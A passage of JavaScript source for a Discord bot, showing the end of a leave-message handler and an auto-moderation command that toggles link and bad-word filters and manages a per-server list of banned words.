        settings.leaveMessages = ['{username} has left {server}. We\'ll miss you! 👋'];
        
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('👋 Leave Messages Cleared')
          .setDescription('All leave messages have been cleared and reset to default.')
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Status', value: 'Reset to default message', inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Cleared by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;
    }
  }

  if (interaction.commandName === 'automod') {
    const setting = interaction.options.getString('setting');
    const word = interaction.options.getString('word');
    commandStats.automod++;

    // Get or create auto-mod settings
    let autoMod = autoModSettings.get(interaction.guild.id);
    if (!autoMod) {
      autoMod = {
        linkFilter: false,
        badWordFilter: false,
        badWords: [...defaultBadWords]
      };
      autoModSettings.set(interaction.guild.id, autoMod);
    }

    let embed;

    switch (setting) {
      case 'link_on':
        autoMod.linkFilter = true;
        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('🛡️ Link Filter Enabled')
          .setDescription('Automatic link detection and deletion is now active.');
        break;

      case 'link_off':
        autoMod.linkFilter = false;
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('🛡️ Link Filter Disabled')
          .setDescription('Automatic link detection and deletion is now inactive.');
        break;

      case 'word_on':
        autoMod.badWordFilter = true;
        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('🛡️ Bad Word Filter Enabled')
          .setDescription('Automatic inappropriate content detection is now active.');
        break;

      case 'word_off':
        autoMod.badWordFilter = false;
        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('🛡️ Bad Word Filter Disabled')
          .setDescription('Automatic inappropriate content detection is now inactive.');
        break;

      case 'add_word':
        if (!word) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a word or words to add (separate multiple words with commas).',
            ephemeral: true
          });
        }
        
        // Split by comma and clean up each word
        const wordsToAdd = word.split(',').map(w => w.trim().toLowerCase()).filter(w => w.length > 0);
        const newWords = [];
        const existingWords = [];
        
        for (const wordToAdd of wordsToAdd) {
          if (!autoMod.badWords.includes(wordToAdd)) {
            autoMod.badWords.push(wordToAdd);
            newWords.push(wordToAdd);
          } else {
            existingWords.push(wordToAdd);
          }
        }
        
        if (newWords.length > 0) {
          let description = `Added ${newWords.length} word${newWords.length > 1 ? 's' : ''} to the bad words list:\n${newWords.map(w => `\`${w}\``).join(', ')}`;
          if (existingWords.length > 0) {
            description += `\n\nSkipped ${existingWords.length} word${existingWords.length > 1 ? 's' : ''} (already exists):\n${existingWords.map(w => `\`${w}\``).join(', ')}`;
          }
          
          embed = new EmbedBuilder()
            .setColor(0x00ff88)
            .setTitle('🛡️ Bad Words Added')
            .setDescription(description);
        } else {
          return interaction.reply({
            content: '<:no:1393890945929318542> All provided words are already in the bad words list.',
            ephemeral: true
          });
        }
        break;

      case 'remove_word':
        if (!word) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please provide a word or words to remove (separate multiple words with commas).',
            ephemeral: true
          });
        }
        
        // Split by comma and clean up each word
        const wordsToRemove = word.split(',').map(w => w.trim().toLowerCase()).filter(w => w.length > 0);
        const removedWords = [];
        const notFoundWords = [];
        
        for (const wordToRemove of wordsToRemove) {
          const index = autoMod.badWords.indexOf(wordToRemove);
          if (index > -1) {
            autoMod.badWords.splice(index, 1);
            removedWords.push(wordToRemove);
          } else {
            notFoundWords.push(wordToRemove);
          }
        }
        
        if (removedWords.length > 0) {
          let description = `Removed ${removedWords.length} word${removedWords.length > 1 ? 's' : ''} from the bad words list:\n${removedWords.map(w => `\`${w}\``).join(', ')}`;
          if (notFoundWords.length > 0) {
            description += `\n\nCouldn't find ${notFoundWords.length} word${notFoundWords.length > 1 ? 's' : ''}:\n${notFoundWords.map(w => `\`${w}\``).join(', ')}`;
          }
          
          embed = new EmbedBuilder()
            .setColor(0xff6b6b)
            .setTitle('🛡️ Bad Words Removed')
            .setDescription(description);
        } else {
          return interaction.reply({
            content: '<:no:1393890945929318542> None of the provided words were found in the bad words list.',
            ephemeral: true
          });
        }
        break;

      case 'list_words':
        const wordList = autoMod.badWords.length > 0 ? 
          autoMod.badWords.slice(0, 20).map(w => `\`${w}\``).join(', ') + 
          (autoMod.badWords.length > 20 ? ` +${autoMod.badWords.length - 20} more` : '') :
          'No bad words configured';
        
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('🛡️ Bad Words List')
          .setDescription(wordList)
          .addFields(
            { name: 'Total Words', value: `${autoMod.badWords.length}`, inline: true }
          );
        break;

      case 'show':
        embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle('🛡️ Auto-Moderation Settings')
          .setDescription('Current auto-moderation configuration')
          .addFields(
            { name: 'Link Filter', value: autoMod.linkFilter ? '<:yes:1393890949960306719> Enabled' : '<:no:1393890945929318542> Disabled', inline: true },
            { name: 'Bad Word Filter', value: autoMod.badWordFilter ? '<:yes:1393890949960306719> Enabled' : '<:no:1393890945929318542> Disabled', inline: true },
            { name: 'Bad Words Count', value: `${autoMod.badWords.length} words`, inline: true },
            { name: 'Bypass Permissions', value: 'Administrators and Moderators can bypass link filter', inline: false }
          );
        break;
    }

    embed.setTimestamp()
      .setFooter({
        text: `Updated by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [embed] });
  }
});

client.login(process.env.BOT_TOKEN);
